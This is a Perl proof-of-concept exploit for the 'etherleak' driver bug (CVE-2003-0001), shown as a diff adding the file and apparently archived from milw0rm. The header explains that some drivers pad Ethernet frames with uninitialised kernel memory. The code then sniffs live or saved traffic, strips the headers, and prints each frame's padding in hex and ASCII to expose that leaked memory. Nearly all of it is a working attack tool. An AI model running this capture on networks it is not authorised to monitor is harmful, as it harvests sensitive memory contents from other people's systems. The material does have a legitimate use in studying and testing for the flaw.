@@ -1,0 +1,193 @@
+#!/usr/bin/perl -w
+# etherleak, code that has been 5 years coming.
+#
+# On 04/27/2002, I disclosed on the Linux Kernel Mailing list,
+# a vulnerability that would be come known as the 'etherleak' bug.  In
+# various situations an ethernet frame must be padded to reach a specific
+# size or fall on a certain boundary.  This task is left up to the driver
+# for the ethernet device.  The RFCs state that this padding must consist
+# of NULLs.  The bug is that at the time and still to this day, many device
+# drivers do not pad will NULLs, but rather pad with unsanitized portions
+# of kernel memory, oftentimes exposing sensitive information to remote
+# systems or those savvy enough to coerce their targets to do so.
+#
+# Proof of this can be found by googling for 'warchild and etherleak', or
+# by visiting:
+#
+#  http://lkml.org/lkml/2002/4/27/101
+#
+# This was ultimately fixed in the Linux kernel, but over time this
+# vulnerability reared its head numerous times, but at the core the
+# vulnerability was the same as the one I originally published.  The most
+# public of these was CVE-2003-0001, which was assigned to address an
+# official @stake advisory.
+#
+# This code can be found its most current form at:
+#  
+#  http://spoofed.org/files/exploits/etherleak
+#
+# Jon Hart <jhart@spoofed.org>, March 2007
+#
+
+use strict;
+use diagnostics;
+use warnings;
+use Getopt::Long;
+use Net::Pcap;
+use NetPacket::Ethernet qw(:ALL);
+use NetPacket::IP qw(:ALL);
+
+my %opts = ();
+my ($iface, $err, $pcap_t, $pcap_save, $filter_string); 
+
+GetOptions( \%opts, 'help', 'filter=s', 'interface=s', 'quiet', 'read=s', 'write=s', 'verbose') or
+            die "Unknown option: $!\n" && &usage();
+
+if (defined($opts{'help'})) {
+   &usage();
+   exit(0);
+}
+
+if (defined($opts{'read'})) {
+   $pcap_t = Net::Pcap::open_offline($opts{'read'}, \$err);
+   if (!defined($pcap_t)) {
+      print("Net::Pcap::open_offline failed: $err\n");
+      exit 1;
+   }
+} else {
+   if (defined($opts{'interface'})) {
+      $iface = $opts{'interface'};
+   } else {
+      $iface = Net::Pcap::lookupdev(\$err);
+      if (defined($err)) {
+         print(STDERR "lookupdev() failed: $err\n");
+         exit(1);
+      } else {
+         print(STDERR "No interface specified.  Using $iface\n");
+      }
+   }
+
+   $pcap_t = Net::Pcap::open_live($iface, 65535, 1, 0, \$err);
+   if (!defined($pcap_t)) {
+      print("Net::Pcap::open_live failed on $iface: $err\n");
+      exit 1;
+   }
+}
+
+my $filter;
+if (Net::Pcap::compile($pcap_t, \$filter, defined($opts{'filter'}) ? $opts{'filter'} : "", 0, 0) == -1) {
+   printf("Net::Pcap::compile failed: %s\n", Net::Pcap::geterr($pcap_t));
+   exit(1);
+}
+
+if (Net::Pcap::setfilter($pcap_t, $filter) == -1) {
+   printf("Net::Pcap::setfilter failed: %s\n", Net::Pcap::geterr($pcap_t));
+   exit(1);
+}
+
+if (defined($opts{'write'})) {
+   $pcap_save = Net::Pcap::dump_open($pcap_t, $opts{'write'});
+   if (!defined($pcap_save)) {
+      printf("Net::Pcap::dump_open failed: %s\n", Net::Pcap::geterr($pcap_t));
+      exit(1);
+   }
+}
+
+Net::Pcap::loop($pcap_t, -1, \&process, "foo");
+Net::Pcap::close($pcap_t);
+
+if (defined($opts{'write'})) {
+   Net::Pcap::dump_close($pcap_save);
+}
+
+
+
+sub process {
+   my ($user, $hdr, $pkt) = @_;
+   my ($link, $ip);
+   my $jump = 0;
+
+   my $datalink = Net::Pcap::datalink($pcap_t);
+   if    ($datalink == 1) { $jump += 14; }
+   elsif ($datalink == 113) { $jump += 16; }
+   else { printf("Skipping datalink $datalink\n"); return; }
+
+   my $l2 = NetPacket::Ethernet->decode($pkt);
+   
+   if ($l2->{type} == ETH_TYPE_IP) {
+      $ip = NetPacket::IP->decode(eth_strip($pkt));
+      $jump += $ip->{len};
+   } elsif ($l2->{type} == ETH_TYPE_ARP) { $jump += 28; }
+   else { 
+      # assume 802.3 ethernet, and just jump ahead the length
+      for ($l2->{dest_mac}) {
+         if (/^0180c200/) {
+            # spanning tree
+            # l2->{type} here will actually be the length.  HACK.
+            $jump += $l2->{type};
+         }
+         elsif (/^01000ccccc/) {
+            # CDP/VTP/DTP/PAgP/UDLD/PVST, etc
+            # l2->{type} here will actually be the length.  HACK.
+            $jump += $l2->{type};
+         } elsif (/^ab0000020000/) {
+            # DEC-MOP-Remote-Console
+            return;
+         } else {
+            # loopback
+            if ($l2->{src_mac} eq $l2->{dest_mac}) { return; }
+            printf("Skipping datalink $datalink l2 type %s\n", $l2->{type}); return;
+         }
+      }
+   }
+
+
+   if ($hdr->{len} > $jump) {
+      my $trailer_bin = substr($pkt, $jump);
+      my $trailer_hex = "";
+      my $trailer_ascii = "";
+      foreach (split(//, $trailer_bin)) {
+         $trailer_hex .= sprintf("%02x", ord($_));
+         if (ord($_) >= 32 && ord($_) <= 126) {
+            $trailer_ascii .= $_;
+         } else { $trailer_ascii .= "."; }
+      }
+      # ignore all trailers that are just single characters repeated.
+      # most OS' use 0, F, 5 or a.
+      unless ($trailer_hex =~ /^(0|5|f|a)\1*$/i) {
+         unless ($opts{'quiet'}) {
+            print("#"x80, "\n");
+            printf("%s -> %s\n", $l2->{src_mac}, $l2->{dest_mac});
+            if ($l2->{type} == ETH_TYPE_IP) {
+               printf("%s -> %s\n", $ip->{src_ip}, $ip->{dest_ip});
+            }
+         }
+         print("$trailer_hex\t$trailer_ascii\n");
+         if (defined($opts{'write'})) {
+            Net::Pcap::dump($pcap_save, $hdr, $pkt);
+         }
+      }
+   }
+}
+
+sub usage {
+   print <<EOF;
+$0 -- A demonstration of the infamous 'etherleak' bug.
+
+   CVE-2003-0001, and countless repeats of the same vulnerability.
+
+   Options:
+   [-h|--help]                  # this message
+   [-i|--interface] <interface> # interface to listen on
+   [-f|--filter] <pcap filter>  # apply this filter to the traffic
+   [-r|--read] <path to pcap>   # read from this saved pcap file
+   [-w|--write] <path to pcap>  # write tothis saved pcap file
+   [-q|--quiet]                 # be quiet
+   [-v|--verbose]               # be verbose
+
+EOF
+
+
+}
+
+# milw0rm.com [2007-03-23]
